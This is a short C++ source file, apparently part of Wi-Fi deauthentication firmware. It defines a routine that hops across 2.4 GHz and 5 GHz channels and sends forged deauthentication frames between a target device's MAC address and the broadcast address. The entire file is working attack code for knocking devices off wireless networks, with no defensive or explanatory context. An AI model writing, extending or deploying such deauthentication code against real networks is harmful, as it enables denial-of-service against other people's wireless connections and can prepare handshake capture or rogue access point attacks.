#include "WiFiDeauth.h"
void WiFiDeauth::start(bool is_5ghz) {
  uint8_t* channels = is_5ghz ? channels_5ghz : channels_24ghz;
  for (int i = 0; i < (is_5ghz ? 25 : 13); i++) {
    wext_set_channel(WLAN0_NAME, channels[i]);
    wifi_tx_deauth_frame(target_mac, broadcast_mac, 0x0002);
    delay(50);
  }
}
